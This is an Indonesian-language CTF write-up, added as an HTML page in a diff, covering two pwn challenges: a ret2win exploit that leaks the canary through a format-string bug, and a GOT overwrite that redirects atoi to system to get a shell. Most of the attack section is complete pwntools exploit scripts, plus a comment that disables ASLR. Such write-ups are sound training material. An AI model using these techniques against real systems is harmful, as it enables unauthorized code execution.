@@ -1,0 +1,322 @@
+<nav class="wu-toc" aria-label="Daftar Isi">
+<p class="wu-toc-title">Daftar Isi</p>
+<ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-1-another1">Challange 1 - another1</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-2-another2">Challange 2 - another2</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi-2">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr-2">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit-2">Langkah Exploit</a></li></ul></li></ul>
+</nav>
+<article class="wu-article">
+<p>Attachment -&gt; DM <code>bagas7.</code> di discord.</p>
+<h2 id="challange-1-another1">Challange 1 - another1</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<p>RET2WIN</p>
+<h3 id="tl-dr">TL; DR</h3>
+<p>Chall Ret2Win biasa. Terdapat 2 vulnerability, <strong>Buffer Overflow</strong> dari <strong>gets()</strong> dan <strong>Address Leak</strong> dari <strong>printf()</strong>. Dari checksec, <strong>PIE disable</strong> dan terdapat <strong>canary</strong>. Dan terdapat <strong>win()</strong> function yang melakukan <code>cat ./flag</code>. Jadi alur exploitnya adalah:</p>
+<p>leak <strong>address canary</strong> -&gt; <strong>Buffer Overflow</strong> -&gt; RET ke <strong>win()</strong> -&gt; dapat <strong>flag</strong>.</p>
+<h3 id="langkah-exploit">Langkah Exploit</h3>
+<p>Pertama, check file Binary nya dengan <strong>file</strong> dan <strong>checksec</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HyjxjJUUfe.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ByZfjJILGl.png" alt="image"></p>
+<p>Binary not stripped, no PIE, dan terdapat canary. Dugaan sementara, harus leak canary untuk Buffer Overflow.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/S1nFokLUGx.png" alt="image"></p>
+<p>Setelah di cek dari IDA Pro. Ini adalah tipe chall menu, yang kita bisa pilih mau masuk kedalam function mana dengan input 1/2/3.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/rkfZhJULMx.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HkbuhyUUMl.png" alt="image"></p>
+<p>Ditemukan vulnerability Leak Address dari input nomor 1. <code>printf(s)</code> Dimana <strong>s</strong> diambil dari fgets() di awal program.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/Hkd3nJ8UGx.png" alt="image"></p>
+<p>Dan ditemukan vulnerability Buffer Overflow dari input nomor 2. <code>gets(v7)</code></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/S1HgpJ8Uzl.png" alt="image"></p>
+<p>Permasalahannya sekarang, Saya butuh leak address dari v8 / canary. Karena untuk Overflow stack nya, kita perlu lolos dari pengecekan canary. So, harus timpa canary dengan nilai yang sama.</p>
+<p><strong>FUZZING:</strong></p>
+<pre><code class="language-a">from pwn import *
+context.log_level = &#39;error&#39; #debug / info / warning / error / critical / notset
+
+
+#FUZZING
+for i in range(100):
+    p = process(&quot;./chall&quot;)
+
+    payload = f&#39;%{i}$p&#39;.encode()
+    p.sendline(payload)
+    p.sendline(b&#39;1&#39;)
+    p.recvuntil(b&#39;Name:&#39;)
+    hasil = p.recvuntil(b&#39;Role:&#39;).replace(b&#39;Role:&#39;,b&#39;&#39;)
+    p.recv(999)
+    print(&#39;{&#39;+str((i))+&#39;}&#39;+str(hasil.decode()))
+
+
+gdb.attach(p,&#39;&#39;&#39;
+
+&#39;&#39;&#39;)
+
+p.interactive()
+
+# pwndbg&gt; x/gx rsp
+# 0x7ffcb36ae0d8: 0x0000563e591572b3
+# REGEX Yang harus di hapalin untuk ngambil address: 
+# teks_asli = hasil.decode(errors=&#39;ignore&#39;).strip()
+# match = re.search(r&#39;0x[0-9a-fA-F]+,0x[0-9a-fA-F]+&#39;, teks_asli)
+# canary,baseleak = match.group(0).split(&#39;,&#39;)
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ryEECkU8Me.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SyYECyI8Gx.png" alt="image"></p>
+<p>Pertama, lakukan fuzzing terlebih dahulu. Disini saya menemukan beberapa suspect offset yang kemungkinan adalah canary: <strong>17 | 37</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r1oj01U8fl.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ByLnCyU8fx.png" alt="image"></p>
+<p>Ketemu, offset canary yang benar adalah <code>%37$p</code>. Selanjutnya, cari offset sampai ke RET. Menggunakan vuln <strong>gets()</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/Hyvp1xULGx.png" alt="image"></p>
+<p>Dari header, terdapat info bahwa size nya adalah 40. Lalu bawahnya langsung v8. Kemungkinan formatnya: <strong>40 Char</strong> - <strong>canary</strong> - <strong>Saved RBP</strong> - <strong>RET</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HkyBbxIUGe.png" alt="image"></p>
+<p>Cek dulu. Pertama break di <strong>0x00000000004013d5</strong>, dibawahnya jmp ke main+579 yang isinya manggil chk_fail itu.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HJVobg8IMg.png" alt="image"></p>
+<p>Run, lalu di input 2. saya isi dengan A*40 + AAAABBBB. Seharusnya <strong>kalau benar</strong>. Akan terlempar ke <strong>chk_fail</strong> dan perbandingan canary nya akan menunjuk ke AAAABBBB.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SyrbfeIIfx.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r1ymMeL8zx.png" alt="image"></p>
+<p>Dan benar. Disini masuk ke <strong>chk_fail</strong> dan <strong>canary</strong> di bandingkan dengan <strong>AAAABBBB</strong>. jadi struktur Stack nya yang valid adalah:</p>
+<p><strong>buffer 40 bytes</strong> -&gt; <strong>Canary</strong> -&gt; <strong>Saved RBP</strong> -&gt; <strong>RET</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/BJZWXx88Mg.png" alt="image"></p>
+<p>Jadi tinggal copy aja ini address win() :<code>0x00000000004011a6</code>. Lalu buat payload Ret2Win:</p>
+<p><strong>b&#39;A&#39; x 40 + canary + b&#39;B&#39; x 8 + RET + Win Address</strong>.</p>
+<p>Kenapa ada <strong>B x 8</strong> dan <strong>RET</strong>? Karena Saved RBP itu nilai nya 8 byte. Dan dalam Binary file 64 bit, kadang overflow bisa membuat stack alignment tidak pas kelipatan 16.</p>
+<p><strong>SOLVER:</strong></p>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+
+# %24$p
+
+
+
+p.sendline(b&#39;A&#39;*8+b&#39;%37$p&#39;)
+p.sendline(b&#39;1&#39;)
+p.recvuntil(b&#39;Name:&#39;)
+hasil = p.recvuntil(b&#39;Role:&#39;).replace(b&#39;Role:&#39;,b&#39;&#39;).replace(b&#39;AAAAAAAA&#39;,b&#39;&#39;)
+hasil = int(hasil.decode(), 16)
+p.recv(999)
+print(hex(hasil))
+
+payload = b&#39;A&#39; * 40
+payload += p64(hasil)
+payload += b&#39;B&#39;*8
+payload += p64(0x000000000040101a)
+payload += p64(0x00000000004011a6)
+
+p.sendline(b&#39;2&#39;)
+p.sendline(payload)
+p.sendline(b&#39;3&#39;)
+p.interactive()
+
+
+# Exploit:
+# # /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# python -c &#39;from pwn import * ; print(hex(u64(b&#39;./flagdo&#39;)))&#39;
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1CK4xUIMl.png" alt="image"></p>
+<p>Yay, dapat Flag...</p>
+<h2 id="challange-2-another2">Challange 2 - another2</h2>
+<h3 id="deskripsi-2">Deskripsi</h3>
+<p>GOT Overwrite</p>
+<h3 id="tl-dr-2">TL; DR</h3>
+<p>Chall GOT Overwrite. Terdapat vulnerability address leak dari function <strong>read_spell()</strong> dan overwrite address dari function <strong>write_spell()</strong>. Untuk melakukan spawn shell, saya perlu address dari libc. Dengan cara <strong>leak</strong> salah satu <strong>GOT</strong> menggunakan <strong>read_spell()</strong>. Setelah mendapatkan GOT, hitung base libc. Dan cari address dari <strong>system()</strong> di dalam libc. Lalu saya lakukan trace untuk instruction yang sekiranya bisa di overwrite dan bisa berubah menjadi <strong>system(&#39;/bin/sh&#39;)</strong>. Disini terdapat 1 kandidat, yaitu <strong>atoi()</strong>. Jadi urutan exploitnya adalah:</p>
+<p>Leak GOT -&gt; Cari address <strong>system()</strong> -&gt; Overwrite <strong>GOT atoi()</strong> untuk menunjuk ke address <strong>system()</strong> -&gt; <strong>spawn shell</strong>.</p>
+<h3 id="langkah-exploit-2">Langkah Exploit</h3>
+<p>Pertama, check file Binary nya dengan <strong>file</strong> dan <strong>checksec</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SkbfBqLLMe.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1A7r5LUzg.png" alt="image"></p>
+<p>Waw, Hijau semua. Terdapat PIE, Canary, dan NX. Tapi <strong>Partial RELRO</strong>. So, memungkinkan banget untuk melakukan overwrite. Dan file nya juga <strong>not stripped</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/BJIk85IUGl.png" alt="image"></p>
+<p>Disini program define sebuah variable dengan nama spells. Kemungkinan ini variable bakal jadi patokan untuk melakukan <strong>leak address</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1oVI5U8Gg.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r198LcUIGx.png" alt="image"></p>
+<p>Saya masuk ke <strong>read_spell()</strong> dulu. Disini dia memanggil <strong>get_int()</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/rkmZv5ULze.png" alt="image"></p>
+<p>Di dalam get_int() ada 2 function utama. <strong>fgets()</strong> dan <strong>atoi()</strong>. fgets akan meminta input dengan ukuran maksimal <strong>0x20 char</strong>. Lalu nilainya akan dirubah menjadi <strong>int</strong> oleh atoi.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/B1yYD5L8Gx.png" alt="image"></p>
+<p>Lalu kembali ke read_spell(), disini nilai hasil atoi akan disimpan ke <strong>uVar1</strong>. Addressnya di print oleh <strong>printf()</strong>. Tapi disini dia menggunakan (uint), dimana hanya akan print 4 byte saja. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SkTou9LLfg.png" alt="image"></p>
+<p>Karena <strong>uint</strong> akan <strong>memaksa printf</strong> untuk print addressnya sebagai <strong>32 bit</strong>. Dimana address program sendiri adalah <strong>64 bit</strong>. Jadi yang seharusnya <strong>8 byte long</strong>, hanya akan muncul <strong>4 byte</strong> saja.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1flPq8UMx.png" alt="image"></p>
+<p>Program bakal print addresnya ini dengan format hex langsung. Jadi gampang trace nya.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r1lOtcLUzx.png" alt="image"></p>
+<p>Jadi cara leak address adalah dengan membuat nilai dari <code>spells + (long)(int)uVar1 * 4</code> agar menjadi address dari GOT. Pertama kita harus turunkan rumusnya dulu.</p>
+<p>spells + (var1 * 4) = GOT -&gt; <strong>var1 = (GOT - spells)/4</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/BkbJicU8ze.png" alt="image"></p>
+<p>Cara paling cepat, kita hitung offset dari spells ke salah satu GOT.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HyGUo5IUfl.png" alt="image"></p>
+<p>Disini saya pilih <strong>GOT printf</strong> untuk di leak.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/rkEisqULMg.png" alt="image"></p>
+<p>Jadi offset GOT ny adalah <code>-0x88</code>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1aCh9LIze.png" alt="image"></p>
+<p>var1 = (GOT - spells) / 4<br>var1 = -0x88 / 4<br>var1 = -34</p>
+<p>Kita coba read ke <strong>-34</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ByxFfT98Lzl.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HyLQa5LUGe.png" alt="image"></p>
+<p>Addressnya sama di bagian akhir, ...64300. Jadi valid. GOT ter leak tapi hanya bagian akhirnya saja. Bagian depannya seharusnya ada di -33.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HkEKacI8Gl.png" alt="image"></p>
+<p>Oke, benar. Kalau saya gabung = <strong>0x7f650xbb664300</strong>. Itu ada 0x tambahan di tengah, hapus saja. Jadinya = <strong>0x7f65bb664300</strong>, ini adalah address valid dari GOT printf.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/S1gRAqULMl.png" alt="image"></p>
+<p>Untuk menghitung base libc, dari <strong>leak GOT</strong> dikurangi dengan <strong>0x64300</strong>.</p>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall_patched&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+# offset GOT printf = 0x88
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-33&#39;)
+p.recvuntil(b&#39;(&#39;)
+part1 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;)
+
+
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-34&#39;)
+p.recvuntil(b&#39;(&#39;)
+part2 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;).replace(&#39;0x&#39;,&#39;&#39;)
+print(&#39;part1: &#39;,part1)
+print(&#39;part2: &#39;, part2)
+got = f&#39;{part1}&#39; + f&#39;{part2}&#39;
+got = int(got, 16)
+base = got - 0x64300
+print(&#39;GOT LEAK: &#39;, hex(got))
+print(&#39;BASE LIBC: &#39;, hex(base))
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r13IA5LIfx.png" alt="image"></p>
+<p>Oke, hasilnya valid.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/r1HvJiLUMg.png" alt="image"></p>
+<p>Cari offset untuk instruction <strong>system()</strong> dari Binary File libc = <code>000000000005c560</code>.<br>Jadi <code>base + 000000000005c560 = system()</code></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SkZAZiUIGe.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SkvPgsUIfx.png" alt="image"></p>
+<p>Setelah itu dari function <strong>write_spell()</strong> terdapat vulnerability overwrite address. Dimana <code>uVar2</code> akan overwrite nilai dari <code>*(uint *)(spells + (long)(int)uVar1 * 4)</code> atau bisa dibaca: <code>(uVar1 - spells) / 4</code>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HyQ3MiIIfg.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/H1nnGs88Mg.png" alt="image"></p>
+<p>Dari yang saya lihat. Overwrite ke <strong>system()</strong> yang memungkinkan adalah mengubah <strong>atoi()</strong> menjadi <strong>system()</strong>. Karena fgets akan menyimpan input kita ke <strong>local_38</strong> dan langsung diubah dengan <strong>atoi(local_38)</strong>. Jadi kalau local_38 diisi <code>/bin/sh</code> dan atoi diganti dengan system. Maka akan menjadi instruction <code>system(&quot;/bin/sh&quot;)</code> yang valid.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/B1chXsILMe.png" alt="image"></p>
+<p>Permasalahannya adalah overwrite hanya akan mengubah <strong>32 bit / 4 byte</strong> saja. Karena menggunakan <strong>(uint)</strong>. Dan kita tidak bisa melakukan <strong>write 2x</strong>, karena setelah mengubah 4 byte pertama. nilai atoi akan langsung berubah dan kalau addressnya tidak valid, atoi selanjutnya akan menghasilkan <strong>segmentation failed</strong> dari program.  </p>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall_patched&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+# offset GOT printf = 0x88
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-33&#39;)
+p.recvuntil(b&#39;(&#39;)
+part1 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;)
+
+
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-34&#39;)
+p.recvuntil(b&#39;(&#39;)
+part2 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;).replace(&#39;0x&#39;,&#39;&#39;)
+print(&#39;part1: &#39;,part1)
+print(&#39;part2: &#39;, part2)
+got = f&#39;{part1}&#39; + f&#39;{part2}&#39;
+got = int(got, 16)
+base = got - 0x64300
+print(&#39;GOT LEAK: &#39;, hex(got))
+print(&#39;BASE LIBC: &#39;, hex(base))
+system = base + 0x00000000005c560
+print(&#39;Address system: &#39;, system)
+# printf -&gt; atoi offset  =+0x18, offset = -0x70 / 4 = -28
+
+# 1. Ambil 4 byte bawah (Low DWORD)
+low_dword = system &amp; 0xFFFFFFFF
+low_dword2 = (got + 0x18) &amp; 0xFFFFFFFF
+print(&#39;Address system #1: &#39;, low_dword)
+print(&#39;Address atoi: &#39;, low_dword2)
+# 2. Ambil 4 byte atas (High DWORD)
+high_dword = (system &gt;&gt; 32) &amp; 0xFFFFFFFF
+high_dword2 = ((got + 0x18) &gt;&gt; 32) &amp; 0xFFFFFFFF
+print(&#39;Address system #2: &#39;, high_dword)
+print(&#39;Address atoi: &#39;, high_dword2)
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/HkvRVoLLfe.png" alt="image"></p>
+<p>Disini saya coba untuk print address menjadi 2 bagian Low dan High. <strong>Low = Akhir</strong>, <strong>High = Awal</strong>. Bisa dilihat, <strong>address</strong> yang berbeda hanya bagian <strong>Low</strong>. Jadi kita hanya perlu mengubah <strong>4 byte terakhir</strong> saja untuk overwrite <strong>atoi()</strong> menjadi <strong>system()</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/rJdJUs8Lfg.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ryBbLjILMe.png" alt="image"></p>
+<p>Oke, jadi offsetnya adalah -28. Cek dulu.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/BkHXUjLUze.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SyCX8sL8fx.png" alt="image"></p>
+<p>Valid ya. Jadi saya tinggal ganti saja <strong>-28</strong> menjadi <strong>low</strong> dari <strong>system()</strong> lewat write. Lalu setelah itu input <code>/bin/sh</code>.</p>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall_patched&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+gdb.attach(p, gdbscript=&#39;&#39;&#39;
+
+&#39;&#39;&#39;)
+
+# offset GOT printf = 0x88
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-33&#39;)
+p.recvuntil(b&#39;(&#39;)
+part1 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;)
+
+
+p.sendline(b&#39;1&#39;)
+p.recv()
+p.sendline(b&#39;-34&#39;)
+p.recvuntil(b&#39;(&#39;)
+part2 = p.recvuntil(b&#39;)&#39;).strip().decode().replace(&#39;)&#39;,&#39;&#39;).replace(&#39;0x&#39;,&#39;&#39;)
+print(&#39;part1: &#39;,part1)
+print(&#39;part2: &#39;, part2)
+got = f&#39;{part1}&#39; + f&#39;{part2}&#39;
+got = int(got, 16)
+base = got - 0x64300
+print(&#39;GOT LEAK: &#39;, hex(got))
+print(&#39;BASE LIBC: &#39;, hex(base))
+system = base + 0x00000000005c560
+print(&#39;Address system: &#39;, system)
+# printf -&gt; atoi offset  =+0x18, offset = -0x70 / 4 = -28
+
+# 1. Ambil 4 byte bawah (Low DWORD)
+low_dword = system &amp; 0xFFFFFFFF
+low_dword2 = (got + 0x18) &amp; 0xFFFFFFFF
+print(&#39;Address system #1: &#39;, hex(low_dword))
+print(&#39;Address system #1: &#39;, low_dword)
+# 2. Ambil 4 byte atas (High DWORD)
+high_dword = (system &gt;&gt; 32) &amp; 0xFFFFFFFF
+high_dword2 = ((got + 0x18) &gt;&gt; 32) &amp; 0xFFFFFFFF
+print(&#39;Address system #2: &#39;, high_dword)
+print(&#39;Address system #2: &#39;, high_dword2)
+# p.sendline(b&#39;2&#39;)
+# p.sendline(b&#39;-27&#39;)
+# p.sendline(f&#39;{low_dword}&#39;.encode())
+
+p.sendline(b&#39;2&#39;)
+p.sendline(b&#39;-28&#39;)
+p.sendline(f&#39;{low_dword}&#39;.encode())
+
+p.interactive()
+
+
+# Exploit:
+# # /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# python -c &#39;from pwn import * ; print(hex(u64(b&#39;./flagdo&#39;)))&#39;
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/SycsLj88Mx.png" alt="image"></p>
+<p><img loading="lazy" decoding="async" src="/writeups/lksn2026-pwn/ryVhIiLIGg.png" alt="image"></p>
+<p>Yay, exploit berhasil. Dan saya mendapatkan shell</p>
+
+</article>
